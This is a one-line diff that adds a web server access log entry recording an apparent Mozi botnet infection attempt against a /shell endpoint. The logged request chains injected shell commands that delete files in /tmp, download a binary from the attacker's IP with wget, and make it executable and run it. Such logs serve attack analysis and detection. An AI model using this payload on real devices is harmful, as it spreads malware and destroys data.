@@ -1,0 +1,1 @@
+162.212.113.228 - - [21/Apr/2020:18:29:36 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://162.212.113.228:47271/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
